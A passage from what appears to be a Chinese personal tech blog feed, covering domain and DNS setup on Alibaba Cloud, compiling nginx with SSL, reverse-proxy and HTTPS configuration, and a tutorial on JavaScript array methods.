class="line">      &#125;),</span><br><span class="line">    &#125;</span><br><span class="line">    smsClient.sendSms(params);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>执行后，手机上成功收到了短信。</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/9.jpg" alt></p>
<h1 id="域名、DNS、nginx"><a href="#域名、DNS、nginx" class="headerlink" title="域名、DNS、nginx"></a>域名、DNS、nginx</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>虽然通过ip地址可以直接访问你的网站，但是我们很少看到网站是通过ip地址访问的，一般网站都会提供域名。域名直观易记，且在用户访问的域名不改变的情况下，解析的ip地址可以更改。</p>
<p>域名申请可以去万网购买，国家规定了网站需要备案才可以访问，我在阿里云走的备案流程，在阿里云APP填写、上传相应信息即可，以前的流程需要邮寄幕布什么的了，现在只需要在线上操作即可。阿里云的流程走得是比较快的，最终会提交到管局，管局流程就需要等待一阵子了(5~20个工作日)。我的域名从开始备案到备案成功，流程约走了2周。</p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>域名需要解析到ip地址，DNS做的就是这个工作。它可以将易于管理识别的域名转换为计算机用于互连通信的数字IP地址，从而将用户的访问路由到相应的网站或应用服务器。</p>
<p>同样，我使用了阿里云的DNS解析服务。在云解析DNS域名控制台-域名解析，点击添加域名。</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/10.jpg" alt></p>
<p>再添加解析</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/11.jpg" alt></p>
<p>具体配置如下</p>
<p><img src="https://mfaying.github.io/static/images/aliyun/12.jpg" alt></p>
<p>配置完成后访问域名就会解析到记录值所填写的ip地址了。</p>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><p>虽然域名解析到了ip地址(服务器)，但是默认的端口是80(所以请确保服务器的80端口设置了安全组规则，具体可以参考前面文章介绍过的方法)。我们一般服务监听的端口不是80怎么办？其实很简单，我们只需要简单的配置一下nginx转发就可以了。</p>
<p>接下介绍一下在阿里云服务器上安装和使用nginx。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先安装PCRE pcre-devel 和Zlib</p>
<p>PCRE(Perl Compatible Regular Expressions) 是一个Perl库，包括perl兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式，所以需要在linux上安装 pcre库，pcre-devel是使用pcre开发的一个二次开发库。nginx也需要此库。命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y pcre pcre-devel</span><br></pre></td></tr></table></figure>
<p>zlib库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip，所以需要在Centos上安装zlib库。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y zlib zlib-devel</span><br></pre></td></tr></table></figure>
<p>安装GCC和OpenSSL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure>
<p>现在我们开始安装nginx，这里我安装的是1.14.0版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -c https://nginx.org/download/nginx-1.14.0.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压并进入nginx目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf nginx-1.14.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nginx-1.14.0</span><br></pre></td></tr></table></figure>
<p>使用nginx的默认配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>
<p>编译安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>查找安装路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# whereis nginx</span><br><span class="line">nginx: /usr/local/nginx</span><br></pre></td></tr></table></figure>
<p>进入sbin目录，可以看到有一个可执行文件nginx，直接./执行就OK了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ ~]# cd /usr/local/nginx</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ nginx]# ls</span><br><span class="line">client_body_temp  fastcgi_temp  logs        sbin       uwsgi_temp</span><br><span class="line">conf              html          proxy_temp  scgi_temp</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ nginx]# cd sbin</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ sbin]# ls</span><br><span class="line">nginx</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ sbin]# ./nginx</span><br></pre></td></tr></table></figure>
<p>配置开机自启动</p>
<p>在rc.local增加启动代码就可以。增加一行 /usr/local/nginx/sbin/nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br></pre></td></tr></table></figure>
<p>设置执行权限：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 755 rc.local</span><br></pre></td></tr></table></figure>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>nginx配置文件修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>修改原配置文件的部分内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /opt/nodejs/blog-server/static/blog;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy to the blog server</span><br><span class="line">    location /blog &#123;</span><br><span class="line">        proxy_pass http://0.0.0.0:3000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样访问80端口根路径就会请求index.html文件，匹配/blog路径的请求会被转发到本地服务器的3000端口上。</p>
<p>配置完毕后，可以执行命令检查一下配置是否有错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ conf]# /usr/local/nginx/sbin/nginx -t</span><br><span class="line">nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</span><br></pre></td></tr></table></figure>
<p>最后重启一下nignx就可以了</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>
<p>此时你访问域名，就会按照nginx配置请求前后端资源。试试访问<a href="http://www.readingblog.cn" target="_blank" rel="noopener">我的网站</a> (<a href="http://www.readingblog.cn" target="_blank" rel="noopener">http://www.readingblog.cn</a>)</p>
<h1 id="配置HTTPS"><a href="#配置HTTPS" class="headerlink" title="配置HTTPS"></a>配置HTTPS</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li>备案过的域名</li>
<li>ssl证书(免费的就行)</li>
</ol>
<h2 id="申请证书"><a href="#申请证书" class="headerlink" title="申请证书"></a>申请证书</h2><ol>
<li>登录阿里云控制台产-&gt;产品与服务-&gt;SSL 证书</li>
<li>点击购买证书，证书类型选择免费型DV SSL，完成购买</li>
<li>购买完以后，出现了Symantec 免费版 SSL，操作项下按钮点击。</li>
<li>完善资料、提交审核。我这里域名用的是阿里云DNS服务，按照提示勾选证书绑定的域名在阿里云的云解析，系统生成CSR，直至提交审核。</li>
</ol>
<p>10分钟左右，申请的证书就能审核通过。</p>
<h2 id="下载证书"><a href="#下载证书" class="headerlink" title="下载证书"></a>下载证书</h2><p>确认已获得证书就可以去证书控制台下载证书了，解压后会得到两个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3064445_readingblog.cn.key 3064445_readingblog.cn.pem</span><br></pre></td></tr></table></figure>
<p>不同的服务器类型，证书配置方法也不一样，这里我们以nginx服务器为例做介绍</p>
<h2 id="配置nginx的https"><a href="#配置nginx的https" class="headerlink" title="配置nginx的https"></a>配置nginx的https</h2><ol>
<li>创建存储证书的目录（任意）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /usr/local/nginx/ssl/key</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>上传证书</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -p 22 /usr/local/nginx/ssl/key/3064445_readingblog.cn.pem root@47.92.166.108:/usr/local/nginx/ssl/key</span><br><span class="line"></span><br><span class="line">scp -p 22 /usr/local/nginx/ssl/key/3064445_readingblog.cn.key root@47.92.166.108:/usr/local/nginx/ssl/key</span><br></pre></td></tr></table></figure>
<p>上传完毕后，目录结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ key]# pwd</span><br><span class="line">/usr/local/nginx/ssl/key</span><br><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ key]# ls</span><br><span class="line">3064445_readingblog.cn.key  3064445_readingblog.cn.pem</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>修改nginx配置文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># HTTPS server</span><br><span class="line">#</span><br><span class="line">server &#123;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    ssl_certificate      /usr/local/nginx/ssl/key/3064445_readingblog.cn.pem;</span><br><span class="line">    ssl_certificate_key  /usr/local/nginx/ssl/key/3064445_readingblog.cn.key;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">#    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    ssl_session_timeout  5m;</span><br><span class="line">    ssl_ciphers AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class="line">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /opt/nodejs/blog-server/static/blog;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line">    location /blog &#123;</span><br><span class="line">        proxy_pass http://0.0.0.0:3000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>重启nginx</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>
<h2 id="安装ngx-http-ssl-module"><a href="#安装ngx-http-ssl-module" class="headerlink" title="安装ngx_http_ssl_module"></a>安装ngx_http_ssl_module</h2><p>如果提示the “ssl” parameter requires ngx_http_ssl_module，说明nginx还需要安装ngx_http_ssl_module模块。</p>
<p>我的nginx安装目录为：/usr/local/nginx，源码包在/usr/nginx-1.14.0<br>首先进入源码包目录，执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module</span><br></pre></td></tr></table></figure>
<p>配置完成后，运行命令make命令(注意此处不能进行make install，否则就是覆盖安装)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<p>替换已安装好的nginx包，替换之前先备份：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak</span><br></pre></td></tr></table></figure>
<p>先停止nginx服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s stop</span><br></pre></td></tr></table></figure>
<p>将刚刚编译好的nginx覆盖掉原有的nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp ./objs/nginx /usr/local/nginx/sbin/</span><br></pre></td></tr></table></figure>
<p>最后就可以启动nginx了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>
<p>删除备份</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf /usr/local/nginx/sbin/nginx.bak</span><br></pre></td></tr></table></figure>
<p>我们可以通过命令查看ssl模块是否已经加入成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@iZ8vbfhrv1vsbp44n9fdtoZ nginx-1.14.0]# /usr/local/nginx/sbin/nginx -V</span><br><span class="line">nginx version: nginx/1.14.0</span><br><span class="line">built by gcc 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC)</span><br><span class="line">built with OpenSSL 1.0.2k-fips  26 Jan 2017</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module</span><br></pre></td></tr></table></figure>
<p>配置完成后就可以通过https<a href="https://www.readingblog.cn" target="_blank" rel="noopener">访问网站了</a> (<a href="https://www.readingblog.cn" target="_blank" rel="noopener">https://www.readingblog.cn</a>)</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript相关</title>
    <url>/2019/10/18/JavaScript%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p>JavaScript相关<br><a id="more"></a><br>javascript节流和防抖</p>
<h1 id="JavaScript的数组"><a href="#JavaScript的数组" class="headerlink" title="JavaScript的数组"></a>JavaScript的数组</h1><p>JavaScript数组也是对象，它使用单一的变量存储一系列的值。</p>
<h2 id="数组和对象的区别"><a href="#数组和对象的区别" class="headerlink" title="数组和对象的区别"></a>数组和对象的区别</h2><p>在JavaScript中，数组必须使用数字索引，对象可以使用命名索引。<br>数组是特殊类型的对象，具有特有的一些属性和方法。</p>
<h2 id="如何区分数组和对象"><a href="#如何区分数组和对象" class="headerlink" title="如何区分数组和对象"></a>如何区分数组和对象</h2><p>方案1</p>
<p>ECMAScript5定义新方法Array.isArray()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.isArray(arr));</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.isArray(obj));</span><br><span class="line"><span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>此方案不支持老的浏览器。</p>
<p>方案2</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(arr));</span><br><span class="line"><span class="comment">// [object Array]</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(obj));</span><br><span class="line"><span class="comment">// [object Object]</span></span><br></pre></td></tr></table></figure>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>使用字面量创建</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br></pre></td></tr></table></figure>
<p>使用构造函数创建</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// []</span></span><br><span class="line">arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [empty × 2]，当构造函数只传一个参数时如2，生成一个长度为2，都为空位的数组</span></span><br><span class="line">arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br></pre></td></tr></table></figure>
<p>出于简洁、可读性和执行速度的考虑，建议使用第一种方法。</p>
<h2 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">1</span>]);<span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="修改值"><a href="#修改值" class="headerlink" title="修改值"></a>修改值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 3]</span></span><br></pre></td></tr></table></figure>
<h2 id="超过数组长度赋值、取值"><a href="#超过数组长度赋值、取值" class="headerlink" title="超过数组长度赋值、取值"></a>超过数组长度赋值、取值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, empty, 3]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">4</span>]);</span><br><span class="line"><span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<h2 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h2><p>数组属于对象,所以可以使用delete运算符执行删除操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [0]</span></span><br><span class="line"><span class="keyword">delete</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [empty]</span></span><br></pre></td></tr></table></figure>
<h2 id="元素长度length"><a href="#元素长度length" class="headerlink" title="元素长度length"></a>元素长度length</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.length);</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="for循环遍历"><a href="#for循环遍历" class="headerlink" title="for循环遍历"></a>for循环遍历</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = arr.length; i &lt; len; i ++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="for…in循环遍历"><a href="#for…in循环遍历" class="headerlink" title="for…in循环遍历"></a>for…in循环遍历</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (index <span class="keyword">in</span> arr) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h2 id="concat-合并两个或多个数组"><a href="#concat-合并两个或多个数组" class="headerlink" title="concat()-合并两个或多个数组"></a>concat()-合并两个或多个数组</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = [<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr1.concat(arr2));</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.concat(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>不会改变原数组</p>
<h2 id="join-将数组元素拼接成一个字符串"><a href="#join-将数组元素拼接成一个字符串" class="headerlink" title="join()-将数组元素拼接成一个字符串"></a>join()-将数组元素拼接成一个字符串</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.join(<span class="string">'-'</span>));</span><br><span class="line"><span class="comment">// 1-2</span></span><br></pre></td></tr></table></figure>
<p>不会改变原数组</p>
<h2 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort()-排序"></a>sort()-排序</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.sort());</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.sort(<span class="function">(<span class="params">item1, item2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item1 - item2;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// [1, 2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.sort(<span class="function">(<span class="params">item1, item2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item2 - item1;</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// [2, 1]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [2, 1]</span></span><br></pre></td></tr></table></figure>
<p>返回对数组的引用，在原数组上进行排序，不生成副本。</p>
<p>说明</p>
<ol>
<li><p>函数中比较如果小于零，则排序结果item1在前，item2在后。即<code>return item1 - item2</code>为升序，反之<code>return item2 - item1</code>为降序。所以<code>return 0.5 - Math.random()</code>可以实现随机排序。</p>
</li>
<li><p>sort也可以对文字排序，和数字排序一样，遵从ASCII编码的排序规则</p>
</li>
</ol>
<h2 id="查找最值"><a href="#查找最值" class="headerlink" title="查找最值"></a>查找最值</h2><p>方案一</p>
<p>查找最小值(最大值同理)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;)[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>需要对数组进行排序，效率较低</p>
<p>方案二<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArrMax</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArrMin</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getArrMax(arr));</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(getArrMin(arr));</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<h2 id="pop-删除并返回数组的最后一个元素"><a href="#pop-删除并返回数组的最后一个元素" class="headerlink" title="pop()-删除并返回数组的最后一个元素"></a>pop()-删除并返回数组的最后一个元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.pop());</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1]</span></span><br></pre></td></tr></table></figure>
<p>会改变原数组</p>
<h2 id="push-向数组的末尾添加一个或多个元素，并返回新的长度"><a href="#push-向数组的末尾添加一个或多个元素，并返回新的长度" class="headerlink" title="push()-向数组的末尾添加一个或多个元素，并返回新的长度"></a>push()-向数组的末尾添加一个或多个元素，并返回新的长度</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.push(<span class="number">3</span>));</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>
<p>会改变原数组</p>
<p>push()方法和pop()方法使用数组提供的先进后出栈的功能。</p>
<h2 id="reverse-颠倒数组中元素的顺序"><a href="#reverse-颠倒数组中元素的顺序" class="headerlink" title="reverse()-颠倒数组中元素的顺序"></a>reverse()-颠倒数组中元素的顺序</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.reverse());</span><br><span class="line"><span class="comment">// [2, 1]</span></span><br></pre></td></tr></table></figure>
<p>会改变原数组</p>
<h2 id="shift-删除数组第一个元素，并返回第一个元素的值"><a href="#shift-删除数组第一个元素，并返回第一个元素的值" class="headerlink" title="shift()-删除数组第一个元素，并返回第一个元素的值"></a>shift()-删除数组第一个元素，并返回第一个元素的值</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.shift());</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [2]</span></span><br></pre></td></tr></table></figure>
<p>会改变原数组</p>
<h2 id="unshift-向数组的开头添加一个或更多元素，并返回新的长度"><a href="#unshift-向数组的开头添加一个或更多元素，并返回新的长度" class="headerlink" title="unshift()-向数组的开头添加一个或更多元素，并返回新的长度"></a>unshift()-向数组的开头添加一个或更多元素，并返回新的长度</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.unshift(<span class="number">3</span>));</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [3, 1]</span></span><br></pre></td></tr></table></figure>
<p>改变原有的数组</p>
<h2 id="slice-返回选定的元素"><a href="#slice-返回选定的元素" class="headerlink" title="slice()-返回选定的元素"></a>slice()-返回选定的元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br></pre></td></tr></table></figure>
<p>start、end都可以使用负值从数组的尾部选取元素，<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.slice(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">// [2]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure></p>
<p>不会改变原数组，如果需要删除数组中的一段元素，应该使用方法</p>
<p>Array.splice()</p>
<h2 id="splice-从数组中添加-删除元素，返回被删除元素"><a href="#splice-从数组中添加-删除元素，返回被删除元素" class="headerlink" title="splice()-从数组中添加/删除元素，返回被删除元素"></a>splice()-从数组中添加/删除元素，返回被删除元素</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arrayObject.splice(index,howmany,item1,.....,itemX)</span><br></pre></td></tr></table></figure>
